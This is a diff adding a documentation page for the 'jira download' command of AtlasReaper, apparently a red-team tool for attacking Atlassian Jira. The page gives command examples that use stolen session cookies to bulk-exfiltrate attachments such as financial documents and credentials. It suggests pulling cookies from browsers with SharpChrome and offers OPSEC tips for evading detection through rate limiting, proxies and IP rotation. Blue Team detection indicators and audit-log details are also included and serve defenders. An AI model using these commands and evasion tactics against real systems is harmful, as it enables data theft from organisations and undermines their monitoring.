@@ -1,0 +1,242 @@
+---
+title: 'download'
+description: 'Download attachment(s) from Jira issues'
+icon: 'download'
+---
+
+## Overview
+
+The `jira download` command retrieves file attachments from Jira issues using their attachment IDs. This command is essential for offensive operations involving data exfiltration, reconnaissance of uploaded files, analysis of potential sensitive documents, or retrieving payloads uploaded by other team members during collaborative red team engagements.
+
+## Syntax
+
+```bash
+.\AtlasReaper.exe jira download [options]
+```
+
+## Required Parameters
+
+<ParamField path="--url" type="string" required>
+  The base URL of the target Jira instance (e.g., `https://company.atlassian.net`)
+</ParamField>
+
+<ParamField path="--attachments" type="string" required>
+  Comma-separated list of attachment IDs to download (no spaces). Use `jira listattachments` to obtain attachment IDs. Example: `10234,10235,10236`
+</ParamField>
+
+## Optional Parameters
+
+<ParamField path="--cookie" type="string">
+  Authentication cookie (`cloud.session.token` or `tenant.session.token`). Required for downloading attachments from non-public issues
+</ParamField>
+
+<ParamField path="--output-dir" type="string">
+  Directory path where downloaded files will be saved. If not specified, files are saved to the current working directory
+</ParamField>
+
+<ParamField path="--output" type="string">
+  Save command output logs to a specified file
+</ParamField>
+
+## Examples
+
+### Download Single Attachment
+
+Download a single file by its attachment ID:
+
+```bash
+.\AtlasReaper.exe jira download \
+  --url https://company.atlassian.net \
+  --attachments 10234 \
+  --output-dir C:\downloads \
+  --cookie $cookie
+```
+
+### Download Multiple Attachments
+
+Download several files at once using comma-separated IDs:
+
+```bash
+.\AtlasReaper.exe jira download \
+  --url https://company.atlassian.net \
+  --attachments 10234,10235,10236,10237 \
+  --output-dir C:\exfil\jira_files \
+  --cookie $cookie
+```
+
+### Download to Current Directory
+
+Download files to the current working directory:
+
+```bash
+.\AtlasReaper.exe jira download \
+  --url https://company.atlassian.net \
+  --attachments 10234 \
+  --cookie $cookie
+```
+
+### Bulk Document Exfiltration
+
+Download multiple documents after reconnaissance:
+
+```bash
+# First, list attachments to get IDs
+.\AtlasReaper.exe jira listattachments \
+  --url https://company.atlassian.net \
+  --project FIN \
+  --include pdf,docx,xlsx \
+  --cookie $cookie
+
+# Then download identified sensitive files
+.\AtlasReaper.exe jira download \
+  --url https://company.atlassian.net \
+  --attachments 15001,15002,15003,15004,15005 \
+  --output-dir C:\exfil\financial_docs \
+  --cookie $cookie
+```
+
+## Use Cases
+
+<Tabs>
+  <Tab title="Red Team">
+    ### Offensive Security Applications
+
+    - **Data Exfiltration**: Download sensitive documents attached to issues (financial reports, credentials, configs)
+    - **Reconnaissance**: Analyze uploaded files for intelligence gathering
+    - **Payload Retrieval**: Download files uploaded by other attackers or team members
+    - **Credential Harvesting**: Extract password files, configuration files, or documents containing credentials
+    - **Source Code Theft**: Download source code or intellectual property attached to development issues
+    - **Document Analysis**: Retrieve files for metadata analysis or embedded credential discovery
+    - **Evidence Collection**: Download files demonstrating security misconfigurations
+    - **Lateral Movement**: Obtain configuration files or scripts that aid in network traversal
+  </Tab>
+
+  <Tab title="Blue Team">
+    ### Defensive Monitoring
+
+    - **Download Pattern Detection**: Monitor for bulk downloads or unusual download activity
+    - **Sensitive File Monitoring**: Track downloads of files flagged as containing sensitive data
+    - **User Behavior Analysis**: Identify users downloading files they don't typically access
+    - **Time-based Anomalies**: Detect downloads occurring outside normal business hours
+    - **Incident Response**: Download suspicious attachments for malware analysis
+    - **Data Loss Prevention**: Monitor for potential exfiltration via attachment downloads
+    - **Forensic Collection**: Retrieve files for security investigations
+    - **Compliance Auditing**: Track access to regulated or sensitive documents
+  </Tab>
+</Tabs>
+
+## Output
+
+The command downloads files and saves them with their original filenames to the specified directory.
+
+Example output:
+```
+Downloaded: Q4_Financial_Report.pdf
+Downloaded: credentials.txt
+Downloaded: network_diagram.png
+```
+
+### File Handling
+
+- Files are saved with their original filenames as stored in Jira
+- If the output directory doesn't exist, the command may fail (ensure directory exists)
+- Files with duplicate names will overwrite existing files in the output directory
+- File metadata (creation date, author) is not preserved in the downloaded file
+
+### Attachment ID Discovery
+
+Use `jira listattachments` to discover attachment IDs:
+```bash
+.\AtlasReaper.exe jira listattachments \
+  --url https://company.atlassian.net \
+  --project PROJ \
+  --cookie $cookie
+```
+
+Output will include:
+```
+Filename      : sensitive_document.pdf
+Attachment Id : 10234
+Mimetype      : application/pdf
+File size     : 2456789
+```
+
+## Detection Considerations
+
+<Warning>
+**Detection Indicators**
+
+Security teams should monitor for:
+
+- Bulk downloads (multiple attachments in short timeframe)
+- Downloads of files from issues the user doesn't typically access
+- Downloads outside normal business hours
+- Sequential attachment ID downloads (automated scraping pattern)
+- Downloads from unusual IP addresses or geographic locations
+- Downloads of sensitive file types (credentials, configs, financial documents)
+- Downloads by service accounts or API tokens
+- Downloads after unauthorized access or compromised credentials
+- High volume of downloads by a single user
+- Downloads of old attachments that haven't been accessed recently
+</Warning>
+
+### Jira Audit Log Entries
+
+This command generates the following audit log events:
+- `attachment_viewed` or `attachment_downloaded` - Records the download activity
+- Includes: User ID, attachment ID, issue key, timestamp, IP address
+
+### Network Indicators
+
+- HTTP GET requests to `/rest/api/3/attachment/{attachmentId}` (metadata retrieval)
+- HTTP GET requests to attachment content URLs
+- Large HTTP response sizes corresponding to file downloads
+- Multiple sequential requests if downloading multiple attachments
+
+## OPSEC Considerations
+
+<Tip>
+**Operational Security Tips**
+
+To reduce detection risk when using this command:
+
+1. **Rate Limiting**: Space out downloads to avoid triggering bulk download alerts
+2. **Timing**: Download during business hours when legitimate access is common
+3. **Selective Downloads**: Only download necessary files rather than everything
+4. **Access Patterns**: Use accounts that have legitimate reasons to access the files
+5. **IP Rotation**: Consider using VPNs or proxies to vary source IP addresses
+6. **Small Batches**: Download in small groups rather than large bulk operations
+7. **Issue Context**: Ensure the authenticated user has legitimate access to the parent issues
+8. **File Prioritization**: Target high-value files first in case operation is detected
+9. **Network Transfer**: Be aware of network bandwidth monitoring
+10. **Time Distribution**: Spread downloads across multiple sessions/days for large datasets
+</Tip>
+
+### Download Limitations
+
+- Requires valid authentication cookie for non-public attachments
+- File size limits may apply based on network/system constraints
+- Some attachments may be restricted by issue-level permissions
+- Deleted attachments cannot be downloaded (404 errors)
+
+### Cookie Considerations
+
+- Session cookies can be extracted from user browsers using tools like SharpChrome
+- Ensure cookie validity before initiating large download operations
+- Different cookies may have different permissions based on the user's role
+- Anonymous downloads typically not permitted
+
+### File System Considerations
+
+- Ensure sufficient disk space for downloaded files
+- Be aware of file system path length limitations (Windows: 260 characters)
+- Downloaded files inherit local system permissions
+- Antivirus may scan downloaded files and potentially alert
+
+## Related Commands
+
+- [jira listattachments](/jira/listattachments) - List attachments and obtain attachment IDs for download
+- [jira attach](/jira/attach) - Upload files to issues
+- [jira listissues](/jira/listissues) - View issues and their attachments
+- [jira searchissues](/jira/searchissues) - Search for issues containing specific attachments
+- [jira listprojects](/jira/listprojects) - Identify projects that may contain valuable attachments
